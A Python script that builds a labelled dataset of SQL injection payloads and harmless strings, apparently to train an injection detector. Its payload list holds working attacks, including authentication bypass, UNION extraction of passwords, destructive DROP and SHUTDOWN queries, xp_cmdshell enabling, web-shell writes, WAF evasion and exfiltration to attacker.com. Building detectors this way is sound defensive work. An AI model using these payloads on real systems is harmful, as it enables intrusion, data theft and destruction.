import pandas as pd
import numpy as np
import os
import random
import string

# --- CẤU HÌNH ---
TOTAL_ROWS = 15000 
OUTPUT_DIR = "../datasets/raw"

# ==========================================
# 1. KHO MẪU SQL INJECTION KHỔNG LỒ
# ==========================================
sqli_bases = [
    # 1. AUTH BYPASS & GENERIC TAUTOLOGY
    "admin' --", "admin' #", "admin'/*", 
    "' OR '1'='1", "\" OR \"1\"=\"1", 
    "' OR 1=1 --", "' OR 1=1 #", "' OR 1=1/*",
    "1' OR '1'='1", "1' OR 1=1", 
    "admin' OR '1'='1'--", "admin' OR '1'='1'#", 
    "' OR TRUE --", "' OR TRUE #",
    "' OR 'x'='x", "' OR 'a'='a",
    "login' OR '1'='1", 
    "' OR 1=1 LIMIT 1 --", "' OR 1=1 LIMIT 1 #",
    "' OR 0=0 #", "' OR 3>1 --",
    "'='", "'LIKE'", "'=0--+", 
    "admin' OR 1=1 -- -",
    "check' OR '1'='1",
    "id' OR '1'='1",
    "name' OR '1'='1",
    "') OR ('1'='1",
    "1) OR (1=1",
    "1)) OR ((1=1",
    "' OR 1=1 OR ''='",
    "admin' -- -", 
    
    # 2. UNION BASED
    "UNION SELECT 1", "UNION SELECT 1,2", "UNION SELECT 1,2,3", 
    "UNION SELECT 1,2,3,4", "UNION SELECT 1,2,3,4,5",
    "UNION SELECT 1,2,3,4,5,6", "UNION SELECT 1,2,3,4,5,6,7",
    "UNION ALL SELECT 1,2,3", "UNION ALL SELECT 1,2,3--",
    "' UNION SELECT 1, user(), 3 --", 
    "' UNION SELECT 1, database(), 3 --",
    "' UNION SELECT 1, version(), 3 --", 
    "' UNION SELECT 1, @@version, 3 --",
    "UNION SELECT null, null, null",
    "UNION SELECT null, null, null--",
    "UNION SELECT username, password FROM users",
    "UNION SELECT id, email, password FROM admins",
    "UNION SELECT table_name, null FROM information_schema.tables",
    "UNION SELECT column_name, null FROM information_schema.columns",
    "id=-1 UNION SELECT 1, 2, 3", 
    "id=-999 UNION SELECT 1, 2, 3",
    "' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables --",
    "' UNION SELECT 1, group_concat(column_name), 3 FROM information_schema.columns WHERE table_name='users' --",
    "-1 UNION SELECT 1, INTO OUTFILE '/var/www/html/shell.php' --",
    "' UNION SELECT 1, load_file('/etc/passwd'), 3 --",
    "1' UNION SELECT null, table_name, null FROM information_schema.tables WHERE table_schema=database()--",
    
    # 3. ERROR BASED
    "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(version(), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a) --",
    "' AND ExtractValue(1, CONCAT(0x5c, (SELECT user()), 0x5c)) --",
    "' AND UpdateXML(1, CONCAT(0x5c, (SELECT user()), 0x5c), 1) --",
    "1' AND 1=1 AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(version(), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a) --",
    "EXP(~(SELECT*FROM(SELECT USER())a))",
    "BIGINT UNSIGNED value is out of range",
    "1' AND 1=CONVERT(int, @@version) --",
    "1' AND 1=CAST(@@version AS int) --",
    "1' AND 1=CAST((SELECT table_name FROM information_schema.tables TOP 1) AS int)--",
    "1' AND 1=CAST(version() AS int)--",
    "1'::int", 
    "1' AND 1=(SELECT 1/0)--",
    "1' AND 1=utl_inaddr.get_host_name((SELECT banner FROM v$version))--",
    "1' AND 1=ctxsys.drithsx.sn(1, (SELECT user FROM dual))--",

    # 4. BLIND & TIME BASED
    "SLEEP(5)", "SLEEP(10)", 
    "1' AND SLEEP(5) --", "1' AND SLEEP(10) --",
    "' AND IF(1=1, SLEEP(5), 0) --", 
    "1' AND BENCHMARK(10000000,MD5(1)) --",
    "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "pg_sleep(5)", "pg_sleep(10)", 
    "1' AND pg_sleep(5) --",
    "|| pg_sleep(5) --",
    "(SELECT 5 FROM pg_sleep(5))",
    "WAITFOR DELAY '0:0:5'", 
    "WAITFOR DELAY '0:0:10'", 
    "1'; WAITFOR DELAY '0:0:5'--",
    "1'; WAITFOR TIME '23:59:59'--",
    "1' AND 1=dbms_pipe.receive_message('RDS', 5)--",
    "1' AND 1=dbms_lock.sleep(5)--",
    "1' AND SUBSTRING(version(),1,1)='5'",
    "1' AND SUBSTRING(user(),1,1)='r'",
    "1' AND ASCII(SUBSTRING(database(),1,1))>100",
    "1' AND 1=1", "1' AND 1=0",
    "id=1 AND (SELECT length(database()))=4",
    
    # 5. STACKED QUERIES & RCE
    "1; DROP TABLE users", "1; DROP TABLE logs", "1; DROP DATABASE test",
    "1'; DROP TABLE users--", "1'; TRUNCATE TABLE users--",
    "1'; DELETE FROM users WHERE 1=1--",
    "1'; UPDATE users SET password='hacked'--",
    "1'; INSERT INTO users (user, pass) VALUES ('hacker', '123')--",
    "1'; SHUTDOWN --", 
    "1'; DROP DATABASE master --",
    "1'; EXEC master..xp_cmdshell 'ping 127.0.0.1' --",
    "1'; EXEC master..xp_cmdshell 'whoami' --",
    "1'; EXEC sp_addlogin 'hacker', 'password' --",
    "1'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; --",
    "1'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --",
    
    # 6. WAF EVASION & OBFUSCATION
    "1 OR 1=1", "1/**/OR/**/1=1", "1%20OR%201=1", "1%09OR%091=1",
    "1%0AOR%0A1=1", "1+OR+1=1",
    "UN/**/ION SEL/**/ECT", "UNI/**/ON SEL/**/ECT",
    "SeLeCt * FrOm", "sElEcT", "uNiOn",
    "/*!50000SELECT*/", "/*!50000UNION*/",
    "%27%20UNION%20SELECT%20", 
    "0x554e494f4e", # HEX UNION
    "CHAR(85)+CHAR(78)+CHAR(73)+CHAR(79)+CHAR(78)",
    "CONCAT('U','N','I','O','N')",
    "id=1 AND 1=1 -- -",
    "id=1 AND 1=1 #",
    "1' AND 1=1 AND '%'='",
    "1' AND 1=1 AND 'a'='a",
    "1%27%20AND%201=1%23",
    "1%22%20AND%201=1%23",
    "1' AND 1=1 AND 1=1",
    "/**/UNION/**/SELECT/**/",
    
    # 7. INJECTION POINTS
    "ORDER BY 1", "ORDER BY 10", "ORDER BY 100",
    "ORDER BY 1--", "ORDER BY 1#",
    "GROUP BY 1,2,3", "GROUP BY 1,2,3--",
    "HAVING 1=1", "HAVING 1=1--",
    "LIMIT 1,1", "LIMIT 0,1", 
    "PROCEDURE ANALYSE()",
    "1 INTO OUTFILE",
    "1 INTO DUMPFILE",

    # 8. OUT OF BAND (OOB)
    "1'; SELECT LOAD_FILE(CONCAT('\\\\', (SELECT user()), '.attacker.com\\abc')); --",
    "1'; EXEC master..xp_dirtree '\\\\attacker.com\\foo' --",
    "1' AND (SELECT UTL_INADDR.get_host_address((SELECT user FROM dual)||'.attacker.com') FROM dual) IS NOT NULL--",
    "1' AND (SELECT UTL_HTTP.request('http://attacker.com/'||(SELECT user FROM dual)) FROM dual) IS NOT NULL--",

    # 9. POLYGLOTS & COMPLEX
    "SLEEP(1) /*' or SLEEP(1) or '\" or SLEEP(1) or \"*/",
    "1;SELECT pg_sleep(5);",
    "1 AND (SELECT * FROM (SELECT(SLEEP(5)))b)",
    "'%20OR%201=1",
    "1' OR '1'='1' /*",
    "1' OR 1=1 -- -",
    "admin' --",
    "javascript:alert(1);//", 
    "UN/**/ION SEL/**/ECT", 
    "SE/**/LECT * FROM users",
    "UN/**/ION SELECT",
    "UNION SEL/**/ECT",
    "1'/**/OR/**/1=1",
    "AD/**/MIN' --",
    # --- CÁC MẪU NÀY ĐỂ AI HỌC ĐƯỢC CHIÊU LÁCH LUẬT ---
    "UN/**/ION SEL/**/ECT", 
    "SE/**/LECT * FROM users",
    "UN/**/ION SELECT",
    "UNION SEL/**/ECT",
    "1'/**/OR/**/1=1",
    "AD/**/MIN' --",
    "sel/**/ect user from admins",
    # -------------------------------------------------------
]

# ==========================================
# 2. KHO MẪU VÔ HẠI (NORMAL)
# ==========================================
normal_bases = [
    # --- DATA AUGMENTATION: NHÂN BẢN CÂU BỊ LỖI ĐỂ DẠY AI ---
    "Select a fruit from the basket", 
    "Select a fruit from the basket", 
    "Select a fruit from the basket", 
    "Select a fruit from the basket", 
    "Select a fruit from the basket", 
    "Select a fruit from the basket", 
    "Select a fruit from the basket", 
    "Select a fruit from the basket", 
    "Select a fruit from the basket", 
    "Select a fruit from the basket", 
    # --------------------------------------------------------

    # Giao tiếp thông thường
    "hello world", "hi there", "how are you?", "good morning", "good night",
    "thank you", "please help", "contact support", "where is the store?",
    "what time is it?", "see you later", "have a nice day", "best regards",
    "Can I speak to the manager?", "I love this product",
    
    # Tìm kiếm & Mua sắm
    "search for products", "iphone 15 pro max", "samsung galaxy", "macbook air",
    "nike shoes", "adidas t-shirt", "blue jeans", "red dress",
    "cheap laptop", "gaming mouse", "mechanical keyboard",
    "order #12345", "track order", "cancel order", "refund request",
    "add to cart", "checkout", "payment method", "shipping address",
    "coupon code", "discount voucher", "gift card",
    "Select an item",
    "Please select from the menu",
    
    # Thông tin cá nhân
    "user@example.com", "admin@company.com", "support@website.com",
    "john.doe", "jane_doe", "my name is John", "I am an admin",
    "address: 123 Main St", "phone: 0909123456", "zip code: 700000",
    "login", "logout", "register", "forgot password",
    "My name is O'Neil", "O'Reilly Auto Parts", "It's a beautiful day",
    "User ID: 1050", "Session ID: abc-123",
    
    # URL & Kỹ thuật
    "http://example.com", "https://google.com", "www.facebook.com",
    "index.php?id=1", "product.php?cat=2", "search?q=hello",
    "api/v1/users", "api/v1/products", "json data: {'a': 1}",
    "timestamp: 123456789", "date: 2023-01-01",
    "localhost:8080", "127.0.0.1", "192.168.1.1",
    
    # Câu chứa từ khóa SQL (Để train model không bắt nhầm)
    "The State of the Union", "Union Square", "Western Union",
    "Select your language", "Select a file", "Please select an option",
    "Drop the box", "Rain drop", "Drop me a message",
    "Table for two", "Periodic table", "Table tennis",
    "Update your status", "Update available", "Last update",
    "Insert coin", "Insert card", "Insert text here",
    "Where are you?", "Where to go?", "Where is the love?",
    "You and I", "Me and you", "Black and White",
    "Or else", "Yes or No", "True or False",
    "Order by name", "Order by price", "Sort by date",
    "Group of people", "Group chat", "Group work",
    "Limit: 100", "Offset: 0", "From time to time",
    "Create a new account", "Alter ego", "Grant permission",
    "Revoke access", "Commit changes", "Rollback transaction",
    "Union High School",
    "Values are important",
    "Delete this message"
]

def random_str(length=5):
    letters = string.ascii_letters + string.digits
    return ''.join(random.choice(letters) for i in range(length))

def generate_payloads(n):
    data = []
    print(f"Generating {n} rows with Advanced Fuzzing...")
    
    for i in range(n):
        if random.random() > 0.5:
            base = random.choice(sqli_bases)
            label = 1
            # Fuzzing cho SQLi (Tạo biến thể)
            r = random.randint(0, 7)
            if r == 0: payload = base
            elif r == 1: payload = base + " -- " + random_str(3) # Thêm comment
            elif r == 2: payload = base.replace(" ", "   ") # Thêm khoảng trắng
            elif r == 3: payload = base + " AND " + str(random.randint(1,99)) + "=" + str(random.randint(1,99)) # Thêm điều kiện
            elif r == 4: payload = base.upper() # Chữ hoa
            elif r == 5: payload = base.lower() # Chữ thường
            elif r == 6: payload = f"/*{random_str(2)}*/" + base # Comment đầu dòng
            else: payload = f"{base} /*{random_str(3)}*/" # Comment giữa/cuối
        else:
            base = random.choice(normal_bases)
            label = 0
            # Fuzzing cho Normal
            r = random.randint(0, 4)
            if r == 0: payload = base
            elif r == 1: payload = base + " " + str(random.randint(1, 9999))
            elif r == 2: payload = random_str(3) + " " + base
            elif r == 3: payload = base + "!"
            else: payload = base.replace(" ", "  ")
            
        data.append([payload, label])
    return data

def main():
    raw_data = generate_payloads(TOTAL_ROWS)
    df = pd.DataFrame(raw_data, columns=['payload', 'label'])
    df = df.sample(frac=1).reset_index(drop=True)
    
    print("Data distribution:")
    print(df['label'].value_counts())

    part_size = len(df) // 3
    df1 = df.iloc[:part_size]
    df2 = df.iloc[part_size:part_size*2]
    df3 = df.iloc[part_size*2:]

    script_dir = os.path.dirname(os.path.abspath(__file__))
    output_path = os.path.join(script_dir, OUTPUT_DIR)
    os.makedirs(output_path, exist_ok=True)

    file1 = os.path.join(output_path, "kaggle_sqli.csv")
    file2 = os.path.join(output_path, "synthetic_payloads.csv")
    file3 = os.path.join(output_path, "waf_logs.csv")

    df1.to_csv(file1, index=False)
    df2.to_csv(file2, index=False)
    df3.to_csv(file3, index=False)

    print(f"\nSUCCESS! Generated {TOTAL_ROWS} rows from HUGE dataset.")

if __name__ == "__main__":
    main()